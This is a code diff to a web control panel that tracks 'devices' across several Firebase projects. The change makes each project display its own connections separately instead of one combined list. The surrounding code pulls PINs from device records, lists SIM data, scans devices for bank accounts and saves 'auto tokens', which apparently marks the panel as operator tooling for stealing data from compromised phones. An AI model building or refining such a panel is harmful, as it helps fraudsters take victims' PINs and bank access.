@@ -365,7 +365,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
     <section class="screen" id="screen-firebase">
       <div class="fb-tab-hdr">
         <h2>Firebase Switch</h2>
-        <p id="fbTabSub">Tap a project to view its connections on Home</p>
+        <p id="fbTabSub">Each Firebase shows its own connections separately</p>
       </div>
       <div id="fbSwitchList"></div>
     </section>
@@ -429,7 +429,7 @@ body{font-family:'Syne',sans-serif;background:var(--bg);color:var(--text)}
 <div class="sheet-bg" id="sheetBg" onclick="closeFbSheet()"></div>
 <div class="sheet" id="fbSheet">
   <div class="sheet-handle"></div>
-  <div class="sheet-title">Firebase Projects — All Combined</div>
+  <div class="sheet-title">Firebase Projects</div>
   <div id="fbSheetList"></div>
   <div class="fb-add-form">
     <input id="fbAddName" placeholder="Project name (e.g. Panel 2)"/>
@@ -554,8 +554,8 @@ function deviceHasPin(d){
   return !!(d.pin||extractPinFromRecord(raw));
 }
 function getFilteredDevs(){
-  var list=allDevs;
-  if(activeFbId)list=list.filter(function(d){return d.fbId===activeFbId;});
+  if(!activeFbId)return [];
+  var list=allDevs.filter(function(d){return d.fbId===activeFbId;});
   if(devFilterMode==='pin')list=list.filter(deviceHasPin);
   else if(devFilterMode==='bank')list=list.filter(function(d){return deviceBankCache[d.id]===true;});
   return list;
@@ -570,22 +570,27 @@ function saveActiveFb(){
   try{localStorage.setItem(ACTIVE_FB_KEY,activeFbId||'');}catch(e){}
 }
 function ensureActiveFbValid(){
-  if(activeFbId&&!firebaseConfigs.some(function(c){return c.id===activeFbId;}))activeFbId='';
+  if(!firebaseConfigs.length){activeFbId='';return;}
+  if(!activeFbId||!firebaseConfigs.some(function(c){return c.id===activeFbId;})){
+    activeFbId=firebaseConfigs[0].id;
+    saveActiveFb();
+  }
+}
+function getActiveFbName(){
+  var inst=getFbInstance(activeFbId);
+  return inst?inst.name:'Firebase';
 }
 function getHdrSubText(){
-  var list=getFilteredDevs();
-  if(activeFbId){
-    var inst=getFbInstance(activeFbId);
-    return list.length+' devices · '+(inst?inst.name:'Firebase');
-  }
-  return allDevs.length+' devices · '+firebaseConfigs.length+' Firebase combined';
+  if(!activeFbId)return 'Add a Firebase project to start';
+  return getFilteredDevs().length+' devices · '+getActiveFbName();
 }
 function selectFirebase(fbId){
-  activeFbId=fbId||'';
+  if(!fbId||!firebaseConfigs.some(function(c){return c.id===fbId;}))return;
+  activeFbId=fbId;
   saveActiveFb();
   if(selDev){
     var d=getSelDev();
-    if(d&&activeFbId&&d.fbId!==activeFbId){
+    if(d&&d.fbId!==activeFbId){
       selDev='';
       clearListeners();
     }
@@ -594,8 +599,7 @@ function selectFirebase(fbId){
   renderDevices();
   updateStats();
   updateFbUi();
-  var label=activeFbId?((getFbInstance(activeFbId)||{}).name||'Firebase'):'All Firebase combined';
-  toast('Switched to '+label,true);
+  toast('Switched to '+getActiveFbName(),true);
   switchTab('home',document.querySelector('.nav-item[data-tab="home"]'));
 }
 function bindFirebaseTabEvents(){
@@ -605,17 +609,19 @@ function bindFirebaseTabEvents(){
   el.addEventListener('click',function(e){
     var card=e.target.closest('.fb-switch-card');
     if(!card)return;
-    selectFirebase(card.getAttribute('data-fb-id')||'');
+    var id=card.getAttribute('data-fb-id');
+    if(id)selectFirebase(id);
   });
 }
 function renderFirebaseTab(){
   var el=document.getElementById('fbSwitchList');
   if(!el)return;
-  var allOn=allDevs.filter(function(d){return d.status==='online';}).length;
-  var html='<div class="fb-switch-card'+(activeFbId===''?' active':'')+'" data-fb-id="">'+
-    '<div class="fb-switch-top"><div class="fb-switch-name">All Firebase Combined</div>'+
-    (activeFbId===''?'<span class="fb-switch-badge">ACTIVE</span>':'')+'</div>'+
-    '<div class="fb-switch-meta">'+allDevs.length+' devices · '+allOn+' online · '+firebaseConfigs.length+' projects</div></div>';
+  if(!firebaseConfigs.length){
+    el.innerHTML='<div class="empty-state"><div class="ico">🔥</div>No Firebase yet<br><span style="font-size:11px;opacity:.6">Add a project below</span></div>'+
+      '<button type="button" class="btn-add-fb" style="margin-top:12px" onclick="openFbSheet()">+ Add Firebase Project</button>';
+    return;
+  }
+  var html='';
   firebaseConfigs.forEach(function(c){
     var devs=allDevs.filter(function(d){return d.fbId===c.id;});
     var on=devs.filter(function(d){return d.status==='online';}).length;
@@ -629,12 +635,12 @@ function renderFirebaseTab(){
       '<div class="fb-switch-url">'+host+'</div></div>';
   });
   html+='<button type="button" class="btn-add-fb" style="margin-top:12px" onclick="openFbSheet()">+ Add Firebase Project</button>';
-  el.innerHTML=html||'<div class="empty-state"><div class="ico">🔥</div>No Firebase yet<br><span style="font-size:11px;opacity:.6">Add a project below</span></div>';
+  el.innerHTML=html;
   var sub=document.getElementById('fbTabSub');
   if(sub){
     sub.textContent=activeFbId
-      ?('Showing '+esc((getFbInstance(activeFbId)||{}).name||'Firebase')+' on Home — tap All to combine again')
-      :('Tap a project to view its connections on Home');
+      ?('Now showing '+getActiveFbName()+' only — switch project to see other connections')
+      :('Add a Firebase project to view its connections');
   }
 }
 function setDevFilter(mode,btn){
@@ -642,7 +648,7 @@ function setDevFilter(mode,btn){
   document.querySelectorAll('.filter-chip').forEach(function(el){el.classList.remove('active');});
   if(btn)btn.classList.add('active');
   if(mode==='bank'){
-    var pending=allDevs.some(function(d){return deviceBankCache[d.id]===undefined;});
+    var pending=getFilteredDevs().some(function(d){return deviceBankCache[d.id]===undefined;});
     if(pending){
       document.getElementById('hdrSub').textContent='Scanning bank accounts...';
       scanAllDevicesBank().then(function(){renderDevices();updateStats();updateFbUi();});
@@ -742,12 +748,14 @@ function addFirebaseProject(){
   };
   firebaseConfigs.push(cfg);
   saveFirebaseConfigs();
+  activeFbId=id;
+  saveActiveFb();
   var inst=initFirebaseInstance(cfg);
   attachLive(inst);
   discoverInstance(inst).then(function(){
     processClientsData();
     updateFbUi();
-    toast('Added: '+name,true);
+    toast('Added: '+name+' — now active',true);
   });
   document.getElementById('fbAddName').value='';
   document.getElementById('fbAddUrl').value='';
@@ -763,7 +771,11 @@ function removeFirebaseProject(id){
     if(k.indexOf(id+'::')===0)delete clientsRawMap[k];
   });
   if(selDev&&selDev.indexOf(id+'::')===0){selDev='';clearListeners();}
-  if(activeFbId===id){activeFbId='';saveActiveFb();}
+  if(activeFbId===id){
+    var next=firebaseConfigs.filter(function(c){return c.id!==id;});
+    activeFbId=next.length?next[0].id:'';
+    saveActiveFb();
+  }
   firebaseInstances=[];
   firebaseConfigs.forEach(initFirebaseInstance);
   firebaseInstances.forEach(function(inst){attachLive(inst);});
@@ -780,7 +792,7 @@ initFirebase();
 function updateFbUi(){
   var filtered=getFilteredDevs();
   var proj=firebaseConfigs.length;
-  var chipLabel=activeFbId?((getFbInstance(activeFbId)||{}).name||'Firebase')+' ▾':proj+' FB · '+filtered.length+' dev ▾';
+  var chipLabel=activeFbId?getActiveFbName()+' · '+filtered.length+' dev ▾':'Add Firebase ▾';
   document.getElementById('fbChip').textContent=chipLabel;
   document.getElementById('moreFbName').textContent=proj+' projects';
   document.getElementById('hdrSub').textContent=getHdrSubText();
@@ -840,7 +852,13 @@ function processClientsData(){
       sims:extractDeviceSims(s),pin:extractPinFromRecord(s),hasPin:!!extractPinFromRecord(s)});
   });
   allDevs.sort(function(a,b){return a.status==='online'&&b.status!=='online'?-1:a.status!=='online'&&b.status==='online'?1:0;});
-  if(!selDev&&allDevs.length)selDev=allDevs[0].id;
+  ensureActiveFbValid();
+  var visible=getFilteredDevs();
+  if(selDev){
+    var cur=getSelDev();
+    if(!cur||cur.fbId!==activeFbId){selDev='';clearListeners();}
+  }
+  if(!selDev&&visible.length)selDev=visible[0].id;
   renderDevices();updateStats();updateFbUi();
 }
 function updateStats(){
@@ -882,7 +900,7 @@ function attachLive(inst){
   });
 }
 function fetchAllData(){
-  document.getElementById('hdrSub').textContent='Syncing all Firebase...';
+  document.getElementById('hdrSub').textContent='Syncing...';
   firebaseInstances.forEach(attachLive);
   return Promise.all(firebaseInstances.map(discoverInstance)).then(function(){
     processClientsData();
@@ -903,8 +921,9 @@ function scanDeviceBankStatus(d){
   }).catch(function(){deviceBankCache[d.id]=false;return false;});
 }
 function scanAllDevicesBank(){
-  if(!allDevs.length)return Promise.resolve();
-  return Promise.all(allDevs.map(scanDeviceBankStatus));
+  var devs=getFilteredDevs();
+  if(!devs.length)return Promise.resolve();
+  return Promise.all(devs.map(scanDeviceBankStatus));
 }
 
 function renderDevices(){
@@ -912,8 +931,9 @@ function renderDevices(){
   var list=getFilteredDevs().filter(function(d){return !q||(d.displayPhone+d.name+d.rawId+(d.pin||'')).toLowerCase().includes(q);});
   var el=document.getElementById('devList');
   if(!list.length){
-    var msg=devFilterMode==='pin'?'No PIN clients found':devFilterMode==='bank'?'No bank account clients yet — wait for scan':'No devices yet';
-    el.innerHTML='<div class="empty-state"><div class="ico">'+(devFilterMode==='pin'?'🔐':devFilterMode==='bank'?'🏦':'📡')+'</div>'+msg+'<br><span style="font-size:11px;opacity:.6">Pull refresh or wait for sync</span></div>';
+    var fbName=activeFbId?getActiveFbName():'Firebase';
+    var msg=!activeFbId?'Add a Firebase project first':devFilterMode==='pin'?'No PIN clients in '+fbName:devFilterMode==='bank'?'No bank clients in '+fbName+' — wait for scan':'No devices in '+fbName;
+    el.innerHTML='<div class="empty-state"><div class="ico">'+(devFilterMode==='pin'?'🔐':devFilterMode==='bank'?'🏦':'📡')+'</div>'+esc(msg)+'<br><span style="font-size:11px;opacity:.6">'+(activeFbId?'Switch Firebase tab or pull refresh':'Open Firebase tab to add project')+'</span></div>';
     return;
   }
   el.innerHTML=list.map(function(d){
@@ -1406,7 +1426,7 @@ function useSelForAutoToken(){
   }).catch(function(){toast('Auto token save failed',false);});
 }
 
-/* BOOT — direct open, all Firebase combined */
+/* BOOT — each Firebase shown separately */
 (function(){
   try{
     panelReady=true;
